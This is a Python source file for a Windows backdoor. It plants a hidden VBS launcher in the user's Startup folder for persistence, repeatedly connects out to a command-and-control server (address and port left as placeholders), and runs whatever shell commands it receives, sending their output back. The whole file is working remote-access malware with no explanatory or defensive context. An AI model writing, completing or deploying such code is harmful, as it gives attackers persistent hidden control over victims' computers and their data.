import socket
import subprocess
import time
import os
import sys
import shutil

# --- 1. PERSISTENCE FUNCTION ---
def add_to_startup():
    try:
        current_path = os.path.realpath(sys.argv[0])
        startup_dir = os.path.join(os.getenv('APPDATA'), r'Microsoft\Windows\Start Menu\Programs\Startup')
        vbs_path = os.path.join(startup_dir, 'win_log.vbs')

        if not os.path.exists(vbs_path):
            with open(vbs_path, 'w') as vbs:
                vbs.write(f'Set objShell = WScript.CreateObject("WScript.Shell")\n')
                vbs.write(f'objShell.Run "cmd /c pythonw.exe ""{current_path}""", 0, False')
            print("[+] Persistence established via VBS Wrapper.")
    except Exception as e:
        print(f"[-] Startup Folder failed: {e}")

# --- 2. INITIALIZE ---
# We establish persistence first so it works even if we can't connect right now
add_to_startup()

# We MUST create the socket object here before using it
client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# --- 3. CONNECTION LOOP ---
print(f"[*] Attempting to connect to IP...")
while True:
    try:
        client.connect(("IP", Port))
        print("[+] Connected to C2 Server!")
        break 
    except:
        time.sleep(10)

# --- 4. COMMAND EXECUTION ---
while True:
    try:
        command = client.recv(4096).decode()
        if not command or command.lower() == "exit":
            break
        output = subprocess.getoutput(command)
        client.send(output.encode())
    except:
        break

client.close()
